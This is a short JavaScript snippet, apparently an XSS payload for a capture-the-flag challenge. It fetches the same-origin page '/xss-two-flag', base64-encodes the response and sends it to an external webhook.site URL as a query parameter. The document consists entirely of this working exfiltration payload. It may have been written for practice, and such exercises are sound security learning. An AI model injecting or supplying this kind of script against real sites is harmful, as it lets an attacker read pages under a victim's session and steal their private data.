var xhr = new XMLHttpRequest();
xhr.open('GET', '/xss-two-flag', true);
xhr.onload = function() {
    var exfil = new XMLHttpRequest();
    exfil.open('GET', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/?flag=' + btoa(xhr.responseText), true);
    exfil.send();
};
xhr.send();
